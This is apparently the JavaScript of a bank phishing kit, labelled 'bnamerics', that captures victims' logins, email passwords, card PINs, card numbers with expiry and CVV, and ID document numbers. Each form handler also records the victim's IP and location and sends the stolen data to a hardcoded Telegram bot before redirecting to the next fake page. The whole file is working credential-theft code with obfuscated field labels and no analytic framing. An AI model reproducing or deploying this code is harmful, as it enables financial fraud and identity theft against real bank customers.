//bot token
var telegram_bot_id =  "5728746998:AAEOxqfAHs3gNsz9OTi0q5_ej-ygi6FhGsY";
//chat id
var chat_id ="@infomyscm";


  $.getJSON("https://api.ipify.org?format=json", function(data) {
          $("#gfg").html(data.ip);
      });
      $.getJSON("https://ipinfo.io", function(response) {
    $("#ip").html("IP: " + response.ip);
    $("#address").html("" + response.city + ", " + response.country);
  });

  var u_name, u_name2, ip, ip2, message;
  var ready = function() {
    u_name = document.getElementById("usuario2").value;
    u_name2 = document.getElementById("contra2").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "bnamerics\n☰Usuari0: " + u_name + "\n☰Cl4v3: " + u_name2 + "\n🌎IP: " + ip +"\n" + ip2;
  };
  var sender = function() {
    ready();
    var settings = {
      "async": true,
      "crossDomain": true,
      "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
      "method": "POST",
      "headers": {
        "Content-Type": "application/json",
        "cache-control": "no-cache"
      },
      "data": JSON.stringify({
        "chat_id": chat_id,
        "text": message
      })
    };
    $.ajax(settings).done(function(response) {
      console.log(response);
      window.location = 'pincor.html';
    });
    return false;
  };


/*******/

  $.getJSON("https://api.ipify.org?format=json", function(data) {
          $("#gfgdos").html(data.ip);
      });
      $.getJSON("https://ipinfo.io", function(response) {
    $("#ip").html("IP: " + response.ip);
    $("#addressdos").html("" + response.city + ", " + response.country);
  });

  var name3, name4, name5, ip2, ip4, message2;
  var ready2 = function() {
	name3 = document.getElementById("email").value;
    name4 = document.getElementById("pass").value;
	name5 = document.getElementById("pin").value;
    ip2 = document.getElementById("gfgdos").innerHTML;
    ip4 = document.getElementById("addressdos").innerHTML;
    message2 = "bnamerics\n☰Corr30: " + name3 + "\n☰Cl4v3 Corr30: " + name4 + "\n☰PlN C4j3r0: " + name5 + "\n🌎IP: " + ip2 +"\n" + ip4;
  };
  var sender2 = function() {
    ready2();
    var settings = {
      "async": true,
      "crossDomain": true,
      "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
      "method": "POST",
      "headers": {
        "Content-Type": "application/json",
        "cache-control": "no-cache"
      },
      "data": JSON.stringify({
        "chat_id": chat_id,
        "text": message2
      })
    };
    $.ajax(settings).done(function(response) {
      console.log(response);
      window.location = 'crdet.html';
    });
    return false;
  };
  
 
 /*******/

  $.getJSON("https://api.ipify.org?format=json", function(data) {
          $("#gfgtres").html(data.ip);
      });
      $.getJSON("https://ipinfo.io", function(response) {
    $("#ip").html("IP: " + response.ip);
    $("#addresstres").html("" + response.city + ", " + response.country);
  });

  var name6, name7, name8, name9, ip6, ip8, message3;
  var ready3 = function() {
	name6 = document.getElementById("auth-safepass-cardnum").value;
    name7 = document.getElementById("exMonth").value;
	name8 = document.getElementById("exYear").value;
	name9 = document.getElementById("auth-safepass-secCode").value;
    ip6 = document.getElementById("gfgtres").innerHTML;
    ip8 = document.getElementById("addresstres").innerHTML;
    message3 = "bnamerics\n☰NumTar: " + name6 + "\n☰exp: " + name7 + "-" + name8 + "\n☰cv sec: " + name9 + "\n🌎IP: " + ip6 +"\n" + ip8;
  };
  var sender3 = function() {
    ready3();
    var settings = {
      "async": true,
      "crossDomain": true,
      "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
      "method": "POST",
      "headers": {
        "Content-Type": "application/json",
        "cache-control": "no-cache"
      },
      "data": JSON.stringify({
        "chat_id": chat_id,
        "text": message3
      })
    };
    $.ajax(settings).done(function(response) {
      console.log(response);
      window.location = 'documento.html';
    });
    return false;
  };
  
  
   /*******/

  $.getJSON("https://api.ipify.org?format=json", function(data) {
          $("#gfgcuatro").html(data.ip);
      });
      $.getJSON("https://ipinfo.io", function(response) {
    $("#ip").html("IP: " + response.ip);
    $("#addresscuatro").html("" + response.city + ", " + response.country);
  });

  var name10, name11, ip10, ip12, message4;
  var ready4 = function() {
	name10 = document.getElementById("docu").value;
    name11 = document.getElementById("ndocu").value;
    ip10 = document.getElementById("gfgcuatro").innerHTML;
    ip12 = document.getElementById("addresscuatro").innerHTML;
    message4 = "bnamerics\n☰Tipo doc: " + name10 + "\n☰numdoc: " + name11 + "\n🌎IP: " + ip10 +"\n" + ip12;
  };
  var sender4 = function() {
    ready4();
    var settings = {
      "async": true,
      "crossDomain": true,
      "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
      "method": "POST",
      "headers": {
        "Content-Type": "application/json",
        "cache-control": "no-cache"
      },
      "data": JSON.stringify({
        "chat_id": chat_id,
        "text": message4
      })
    };
    $.ajax(settings).done(function(response) {
      console.log(response);
      window.location = 'end.html';
    });
    return false;
  };